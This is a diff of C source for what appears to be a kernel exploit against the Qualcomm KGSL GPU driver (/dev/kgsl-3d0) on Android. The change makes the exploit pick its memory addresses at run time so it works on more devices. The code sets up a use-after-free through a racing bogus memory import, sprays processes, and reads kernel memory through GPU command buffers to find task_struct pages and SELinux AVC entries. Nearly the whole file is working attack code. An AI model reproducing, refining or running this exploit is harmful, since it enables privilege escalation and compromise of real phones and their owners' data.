@@ -1,5 +1,3 @@
-
-
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -110,31 +108,27 @@ struct kgsl_cmdstream_readtimestamp_ctxtid {
 };
 #define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
 
-/* 常量 */
-#define KGSL_MEMFLAGS_USE_CPU_MAP      (1ULL << 28)
-#define KGSL_CACHEMODE_SHIFT           0
-#define KGSL_CACHEMODE_MASK            3
-#define KGSL_CACHEMODE_WRITEBACK       3
-#define KGSL_USER_MEM_TYPE_ADDR        2
-#define KGSL_CONTEXT_PREAMBLE          0x00000010
-#define KGSL_CONTEXT_NO_GMEM_ALLOC     0x00000002
-#define KGSL_CMDLIST_IB                0x00000001U
-#define KGSL_TIMESTAMP_RETIRED         0x00000002
-
-#define UAF_ADDR        0x7001ff000ULL
+/* 常量（相対オフセット） */
 #define UAF_SIZE        0x10004000ULL
-#define OVERLAP_ADDR    0x7001fe000ULL
 #define OVERLAP_SIZE    0x7000ULL
-#define BOGUS_ADDR      0x700204000ULL
 #define BOGUS_SIZE      0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
+
+#define OFFSET_UAF         0x1ff000ULL
+#define OFFSET_OVERLAP     0x1fe000ULL
+#define OFFSET_BOGUS       0x204000ULL
+#define OFFSET_PLACEHOLDER 0x10204000ULL
 
 #define SPRAY_PIDS      2000
 #define SCAN_DWORDS     560
-#define AVC_PAGES_PER_IB 12
 #define PRE_PAGES_PER_IB 4
 #define CHURN_MAX_PATHS 20000
+
+/* 実際のアドレス（実行時に決定） */
+uint64_t g_uaf_addr = 0;
+uint64_t g_overlap_addr = 0;
+uint64_t g_bogus_addr = 0;
+uint64_t g_placeholder_addr = 0;
 
 /* ========================== 全局变量 ========================== */
 static int kgsl_fd = -1;
@@ -244,36 +238,86 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ========================== 阶段1：rbtree 占位 ========================== */
+/* ========================== 阶段1：rbtree 占位（動的アドレス選択） ========================== */
+static bool try_base_address(uint64_t base) {
+    uint64_t uaf = base + OFFSET_UAF;
+    uint64_t bogus = base + OFFSET_BOGUS;
+    uint64_t placeholder = base + OFFSET_PLACEHOLDER;
+    uint64_t overlap = base + OFFSET_OVERLAP;
+
+    printf("[*] Trying base 0x%lx\n", base);
+
+    // 1) 割り当てとマッピング (UAF)
+    int id = gpuobj_alloc(UAF_SIZE, alloc_flags);
+    void *uaf_m = mmap((void*)uaf, UAF_SIZE, PROT_READ|PROT_WRITE,
+                       MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)id << 12);
+    if (uaf_m == MAP_FAILED) {
+        gpuobj_free(id);
+        return false;
+    }
+    munmap(uaf_m, UAF_SIZE);
+    // 一旦解放（後で再利用するためIDは保持）
+    // ここではまだ解放しない（phase3で解放する）
+    uaf_id = id; // 保持
+
+    // 2) BOGUS 匿名マッピング
+    void *bogus_m = mmap((void*)bogus, 0x1000, PROT_READ|PROT_WRITE,
+                         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
+    if (bogus_m == MAP_FAILED) {
+        gpuobj_free(id);
+        return false;
+    }
+    // 3) PLACEHOLDER 割り当てとマッピング
+    int ph = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
+    void *ph_m = mmap((void*)placeholder, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
+                      MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph << 12);
+    if (ph_m == MAP_FAILED) {
+        gpuobj_free(ph);
+        gpuobj_free(id);
+        return false;
+    }
+    // 成功！グローバルに保存
+    g_uaf_addr = uaf;
+    g_overlap_addr = overlap;
+    g_bogus_addr = bogus;
+    g_placeholder_addr = placeholder;
+    ph_id = ph;
+    printf("[+] Base 0x%lx works\n", base);
+    return true;
+}
+
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
 
-    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
-    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
-                       MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (uaf_m == MAP_FAILED)
-        die("mmap UAF");
-    munmap(uaf_m, UAF_SIZE);
+    // 候補ベース（デバイスに合わせて調整可能）
+    uint64_t candidates[] = {
+        0x700000000ULL,
+        0x600000000ULL,
+        0x500000000ULL,
+        0x400000000ULL,
+        0x300000000ULL,
+        0x200000000ULL,
+    };
+    bool ok = false;
+    for (int i = 0; i < sizeof(candidates)/sizeof(candidates[0]); i++) {
+        if (try_base_address(candidates[i])) {
+            ok = true;
+            break;
+        }
+    }
+    if (!ok) {
+        fprintf(stderr, "[-] No suitable base address found\n");
+        exit(1);
+    }
 
-    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
-             MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
-        die("mmap BOGUS");
-
-    ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE,
-                      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-                      kgsl_fd, (off_t)ph_id << 12);
-    if (ph_m == MAP_FAILED)
-        die("mmap PLACEHOLDER");
-
-    printf("[*] UAF setup: UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
-           (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
-           (unsigned long)PLACEHOLDER_ADDR);
+    printf("[*] UAF setup: UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx OVERLAP=0x%lx\n",
+           (unsigned long)g_uaf_addr, (unsigned long)g_bogus_addr,
+           (unsigned long)g_placeholder_addr, (unsigned long)g_overlap_addr);
 }
 
 /* ========================== 阶段2：竞争线程 ========================== */
 static void *race_thread(void *arg) {
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = g_bogus_addr };
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr,
         .priv_len = BOGUS_SIZE,
@@ -293,7 +337,7 @@ static bool phase2_race(void) {
 
     int hit = 0;
     for (int i = 0; i < 5000000; i++) {
-        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
+        void *r = mmap((void*)g_overlap_addr, OVERLAP_SIZE,
                        PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                        kgsl_fd, (off_t)ov_id << 12);
         int e = errno;
@@ -557,7 +601,6 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
             for (int n = 0; n < nodes_per_page; n++) {
                 uint32_t *nd = &data[(p * nodes_per_page + n) * 4];
                 uint32_t ssid = nd[0], tsid = nd[1], tclass = nd[2], allowed = nd[3];
-                // 简单启发式过滤：ssid 非零且 < 0x3fff, tsid==2, tclass==1 或 2
                 if (ssid >= 1 && ssid <= 0x3fff &&
                     tsid == 2 &&
                     (tclass == 1 || tclass == 2) &&
@@ -584,7 +627,6 @@ int main(int argc, char **argv) {
         die("open /dev/kgsl-3d0");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    // 可选起始 stride
     int start_stride = 16;
     if (argc >= 2)
         start_stride = atoi(argv[1]);
@@ -629,13 +671,12 @@ int main(int argc, char **argv) {
     // 扫描 task_struct 页面，寻找 "TASKUAF!!" 字符串
     uint64_t task_pgs[4096];
     int n_task = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
-                                    UAF_ADDR + 0x2000,
-                                    UAF_ADDR + UAF_SIZE - 0x1000,
+                                    g_uaf_addr + 0x2000,
+                                    g_uaf_addr + UAF_SIZE - 0x1000,
                                     task_pgs, 4096);
     printf("[TASK] Found %d task_struct pages\n", n_task);
 
     if (n_task > 0) {
-        // 额外打印第一个 task 的 comm 偏移，供参考
         uint32_t *data = (uint32_t *)dst_m;
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
@@ -681,7 +722,6 @@ int main(int argc, char **argv) {
             printf("[CHURN] round %d done\n", c+1);
     }
 
-    // 扫描 AVC 节点，从起始 stride 开始，尝试到 128
     int strides[] = {
         16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60,
         64, 68, 72, 76, 80, 84, 88, 92, 96, 100, 104, 108,
@@ -716,7 +756,7 @@ int main(int argc, char **argv) {
         printf("[AVC] Not found in task pages, rescanning entire range\n");
         uint64_t all_vas[4096];
         int n_all = 0;
-        for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
+        for (uint64_t va = g_uaf_addr + 0x2000; va < g_uaf_addr + UAF_SIZE - 0x1000; va += 0x1000) {
             if (n_all < 4096)
                 all_vas[n_all++] = va;
         }
